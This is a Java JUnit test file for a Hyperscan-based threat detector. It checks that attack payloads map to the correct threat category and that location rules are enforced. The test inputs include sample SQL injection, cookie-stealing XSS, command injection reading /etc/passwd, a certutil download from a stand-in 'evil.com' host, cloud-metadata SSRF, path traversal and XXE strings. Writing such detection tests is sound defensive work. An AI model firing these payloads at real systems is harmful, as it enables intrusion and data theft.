package com.akto.threat.detection.hyperscan;

import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import java.lang.reflect.Field;
import java.util.*;

import static org.junit.Assert.*;

/**
 * Tests that Hyperscan detection produces the correct ThreatCategory (and thus the correct
 * YAML filter ID) for each attack type. Also verifies that location constraints are enforced —
 * a matching payload in the wrong location should NOT be detected.
 */
public class ThreatCategoryMappingTest {

    private static HyperscanThreatMatcher matcher;

    @BeforeClass
    public static void initMatcher() throws Exception {
        resetSingleton();
        matcher = HyperscanThreatMatcher.getInstance();
        boolean ok = matcher.initializeFromClasspath("threat-patterns-example.txt");
        assertTrue("Failed to initialize HyperscanThreatMatcher", ok);
    }

    @AfterClass
    public static void cleanup() throws Exception {
        resetSingleton();
    }

    private static void resetSingleton() throws Exception {
        Field f = HyperscanThreatMatcher.class.getDeclaredField("INSTANCE");
        f.setAccessible(true);
        f.set(null, null);
    }

    // =====================================================================
    //  Helper: scan text at location, resolve to ThreatCategory
    // =====================================================================

    private Set<ThreatCategory> detectAllCategories(String payload, String location) {
        List<HyperscanThreatMatcher.MatchResult> matches = matcher.scan(payload, location);
        Set<ThreatCategory> categories = new HashSet<>();
        for (HyperscanThreatMatcher.MatchResult m : matches) {
            ThreatCategory tc = ThreatCategory.fromPatternPrefix(m.prefix);
            if (tc != null) categories.add(tc);
        }
        return categories;
    }

    private void assertCategory(String payload, String location, ThreatCategory expected) {
        Set<ThreatCategory> detected = detectAllCategories(payload, location);
        assertTrue("Expected " + expected + " for payload in " + location + " but got " + detected,
                detected.contains(expected));
    }

    private void assertNoDetection(String payload, String location) {
        List<HyperscanThreatMatcher.MatchResult> matches = matcher.scan(payload, location);
        assertTrue("Expected no detection in " + location + " but got " + matches.size() + " match(es)", matches.isEmpty());
    }

    // =====================================================================
    //  ThreatCategory.fromPatternPrefix unit tests
    // =====================================================================

    @Test
    public void prefixMapping_sqli() {
        assertEquals(ThreatCategory.SQL_INJECTION, ThreatCategory.fromPatternPrefix("sqli_drop_table"));
        assertEquals(ThreatCategory.SQL_INJECTION, ThreatCategory.fromPatternPrefix("sqli_union_select"));
        assertEquals(ThreatCategory.SQL_INJECTION, ThreatCategory.fromPatternPrefix("sqli_time_based"));
    }

    @Test
    public void prefixMapping_xss() {
        assertEquals(ThreatCategory.XSS, ThreatCategory.fromPatternPrefix("xss_script_tag"));
        assertEquals(ThreatCategory.XSS, ThreatCategory.fromPatternPrefix("xss_event_handler_alert"));
        assertEquals(ThreatCategory.XSS, ThreatCategory.fromPatternPrefix("xss_javascript_protocol"));
    }

    @Test
    public void prefixMapping_nosql() {
        assertEquals(ThreatCategory.NOSQL_INJECTION, ThreatCategory.fromPatternPrefix("nosql_json_operators_comparison"));
        assertEquals(ThreatCategory.NOSQL_INJECTION, ThreatCategory.fromPatternPrefix("nosql_db_operations"));
    }

    @Test
    public void prefixMapping_osCmd() {
        assertEquals(ThreatCategory.OS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("os_cmd_shell_commands"));
        assertEquals(ThreatCategory.OS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("os_cmd_pipe_chain"));
        assertEquals(ThreatCategory.OS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("os_cmd_substitution"));
    }

    @Test
    public void prefixMapping_windows() {
        assertEquals(ThreatCategory.WINDOWS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("windows_cmd_execution"));
        assertEquals(ThreatCategory.WINDOWS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("windows_system_commands"));
        assertEquals(ThreatCategory.WINDOWS_COMMAND_INJECTION, ThreatCategory.fromPatternPrefix("windows_powershell_syntax"));
    }

    @Test
    public void prefixMapping_ssrf() {
        assertEquals(ThreatCategory.SSRF, ThreatCategory.fromPatternPrefix("ssrf_localhost"));
        assertEquals(ThreatCategory.SSRF, ThreatCategory.fromPatternPrefix("ssrf_private_ip"));
        assertEquals(ThreatCategory.SSRF, ThreatCategory.fromPatternPrefix("ssrf_metadata"));
    }

    @Test
    public void prefixMapping_lfi() {
        assertEquals(ThreatCategory.LFI_RFI, ThreatCategory.fromPatternPrefix("lfi_directory_traversal"));
        assertEquals(ThreatCategory.LFI_RFI, ThreatCategory.fromPatternPrefix("lfi_sensitive_files"));
        assertEquals(ThreatCategory.LFI_RFI, ThreatCategory.fromPatternPrefix("lfi_php_wrappers"));
    }

    @Test
    public void prefixMapping_securityMisconfig() {
        assertEquals(ThreatCategory.SECURITY_MISCONFIG, ThreatCategory.fromPatternPrefix("debug_enabled"));
        assertEquals(ThreatCategory.SECURITY_MISCONFIG, ThreatCategory.fromPatternPrefix("version_disclosure"));
        assertEquals(ThreatCategory.SECURITY_MISCONFIG, ThreatCategory.fromPatternPrefix("stack_trace_java"));
        assertEquals(ThreatCategory.SECURITY_MISCONFIG, ThreatCategory.fromPatternPrefix("stack_trace_python"));
        assertEquals(ThreatCategory.SECURITY_MISCONFIG, ThreatCategory.fromPatternPrefix("stack_trace_go"));
    }

    @Test
    public void prefixMapping_nullAndEmpty() {
        assertNull(ThreatCategory.fromPatternPrefix(null));
        assertNull(ThreatCategory.fromPatternPrefix(""));
    }

    @Test
    public void prefixMapping_unknownPrefix() {
        assertNull(ThreatCategory.fromPatternPrefix("unknown_something"));
        assertNull(ThreatCategory.fromPatternPrefix("randomprefix"));
    }

    // =====================================================================
    //  Filter ID correctness (matches YAML IDs)
    // =====================================================================

    @Test
    public void filterId_matchesYamlIds() {
        assertEquals("SQLInjection", ThreatCategory.SQL_INJECTION.getFilterId());
        assertEquals("XSS", ThreatCategory.XSS.getFilterId());
        assertEquals("NoSQLInjection", ThreatCategory.NOSQL_INJECTION.getFilterId());
        assertEquals("OSCommandInjection", ThreatCategory.OS_COMMAND_INJECTION.getFilterId());
        assertEquals("WindowsCommandInjection", ThreatCategory.WINDOWS_COMMAND_INJECTION.getFilterId());
        assertEquals("SSRF", ThreatCategory.SSRF.getFilterId());
        assertEquals("LocalFileInclusionLFIRFI", ThreatCategory.LFI_RFI.getFilterId());
        assertEquals("SecurityMisconfig", ThreatCategory.SECURITY_MISCONFIG.getFilterId());
    }

    @Test
    public void categoryName_matchesYamlCategoryNames() {
        assertEquals("SQL_INJECTION", ThreatCategory.SQL_INJECTION.getCategoryName());
        assertEquals("XSS", ThreatCategory.XSS.getCategoryName());
        assertEquals("NOSQL_INJECTION", ThreatCategory.NOSQL_INJECTION.getCategoryName());
        assertEquals("OS_COMMAND_INJECTION", ThreatCategory.OS_COMMAND_INJECTION.getCategoryName());
        assertEquals("COMMAND_INJECTION", ThreatCategory.WINDOWS_COMMAND_INJECTION.getCategoryName());
        assertEquals("SSRF", ThreatCategory.SSRF.getCategoryName());
        assertEquals("LFI_RFI", ThreatCategory.LFI_RFI.getCategoryName());
        assertEquals("SecurityMisconfig", ThreatCategory.SECURITY_MISCONFIG.getCategoryName());
    }

    // =====================================================================
    //  End-to-end: payload → scan → correct ThreatCategory
    // =====================================================================

    @Test
    public void e2e_sqliInUrl() {
        assertCategory("/api/users?id=' UNION SELECT * FROM users--", "url", ThreatCategory.SQL_INJECTION);
    }

    @Test
    public void e2e_sqliInBody() {
        assertCategory("{\"query\": \"DROP TABLE users\"}", "body", ThreatCategory.SQL_INJECTION);
    }

    @Test
    public void e2e_xssInBody() {
        assertCategory("<script>alert(document.cookie)</script>", "body", ThreatCategory.XSS);
    }

    @Test
    public void e2e_xssInUrl() {
        assertCategory("/search?q=<script>alert(1)</script>", "url", ThreatCategory.XSS);
    }

    @Test
    public void e2e_nosqlInBody() {
        assertCategory("{\"username\": {\"$ne\": \"\"}}", "body", ThreatCategory.NOSQL_INJECTION);
    }

    @Test
    public void e2e_osCmdInBody() {
        assertCategory("; cat /etc/passwd | grep root", "body", ThreatCategory.OS_COMMAND_INJECTION);
    }

    @Test
    public void e2e_osCmdInUrl() {
        assertCategory("/api/run?cmd=;whoami", "url", ThreatCategory.OS_COMMAND_INJECTION);
    }

    @Test
    public void e2e_windowsCmdInBody() {
        assertCategory("; cmd.exe /c dir C:\\Windows\\System32", "body", ThreatCategory.WINDOWS_COMMAND_INJECTION);
    }

    @Test
    public void e2e_windowsSystemCommand() {
        assertCategory("certutil.exe -urlcache -split -f http://evil.com/payload.exe", "body", ThreatCategory.WINDOWS_COMMAND_INJECTION);
    }

    @Test
    public void e2e_ssrfInBody() {
        assertCategory("{\"url\": \"http://169.254.169.254/latest/meta-data/\"}", "body", ThreatCategory.SSRF);
    }

    @Test
    public void e2e_ssrfLocalhostInUrl() {
        assertCategory("/proxy?target=http://127.0.0.1:8080/admin", "url", ThreatCategory.SSRF);
    }

    @Test
    public void e2e_lfiInUrl() {
        assertCategory("/download?file=../../../../etc/passwd", "url", ThreatCategory.LFI_RFI);
    }

    @Test
    public void e2e_lfiPhpWrapper() {
        assertCategory("/page?file=php://filter/convert.base64-encode/resource=config.php", "url", ThreatCategory.LFI_RFI);
    }

    @Test
    public void e2e_debugInResponseBody() {
        assertCategory("{\"debug\": true, \"data\": []}", "resp_body", ThreatCategory.SECURITY_MISCONFIG);
    }

    @Test
    public void e2e_versionDisclosureInResponseBody() {
        assertCategory("Server: Apache/2.4.41 (Ubuntu)", "resp_body", ThreatCategory.SECURITY_MISCONFIG);
    }

    @Test
    public void e2e_stackTraceInResponseBody() {
        assertCategory("Exception in thread main java.lang.NullPointerException", "resp_body", ThreatCategory.SECURITY_MISCONFIG);
    }

    // =====================================================================
    //  Location constraint tests — attack payload present but wrong location
    // =====================================================================

    @Test
    public void locationConstraint_sqliInResponseBody_noDetection() {
        // SQLi patterns only target REQUEST_URL, REQUEST_HEADERS, REQUEST_BODY — not response body
        assertNoDetection("UNION SELECT * FROM users", "resp_body");
    }

    @Test
    public void locationConstraint_xssInResponseBody_noDetection() {
        // XSS patterns only target request locations
        assertNoDetection("<script>alert(1)</script>", "resp_body");
    }

    @Test
    public void locationConstraint_osCmdInResponseBody_noDetection() {
        // OS command injection patterns only target request locations
        assertNoDetection("; cat /etc/passwd", "resp_body");
    }

    @Test
    public void locationConstraint_windowsCmdInResponseBody_noDetection() {
        assertNoDetection("; cmd.exe /c dir", "resp_body");
    }

    @Test
    public void locationConstraint_ssrfInResponseBody_noDetection() {
        assertNoDetection("http://169.254.169.254/latest/meta-data/", "resp_body");
    }

    @Test
    public void locationConstraint_lfiInResponseBody_noDetection() {
        assertNoDetection("../../../../etc/passwd", "resp_body");
    }

    @Test
    public void locationConstraint_xxeInResponseBody_noDetection() {
        assertNoDetection("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "resp_body");
    }

    @Test
    public void locationConstraint_debugInRequestBody_noDetection() {
        // debug_enabled only targets RESPONSE_BODY
        assertNoDetection("{\"debug\": true}", "body");
    }

    @Test
    public void locationConstraint_stackTraceInRequestBody_noDetection() {
        // stack_trace patterns only target RESPONSE_BODY
        assertNoDetection("java.lang.NullPointerException", "body");
    }

    @Test
    public void locationConstraint_versionDisclosureInUrl_noDetection() {
        // version_disclosure only targets RESPONSE_BODY
        assertNoDetection("Server: Apache/2.4.41", "url");
    }

    @Test
    public void locationConstraint_nosqlInResponseBody_noDetection() {
        assertNoDetection("{\"$ne\": \"\"}", "resp_body");
    }

    @Test
    public void locationConstraint_ldapInResponseBody_noDetection() {
        assertNoDetection("(|(uid=*))", "resp_body");
    }

    @Test
    public void locationConstraint_sstiInResponseBody_noDetection() {
        assertNoDetection("{{config.__class__}}", "resp_body");
    }

    // =====================================================================
    //  Location constraint — attack in request headers (should detect)
    // =====================================================================

    @Test
    public void locationConstraint_sqliInHeaders_detected() {
        assertCategory("User-Agent: ' UNION SELECT * FROM users--", "headers", ThreatCategory.SQL_INJECTION);
    }

    @Test
    public void locationConstraint_xssInHeaders_detected() {
        assertCategory("Referer: <script>alert(1)</script>", "headers", ThreatCategory.XSS);
    }

    @Test
    public void locationConstraint_nosqlInHeaders_detected() {
        assertCategory("X-Custom: {\"$ne\": \"\"}", "headers", ThreatCategory.NOSQL_INJECTION);
    }
}
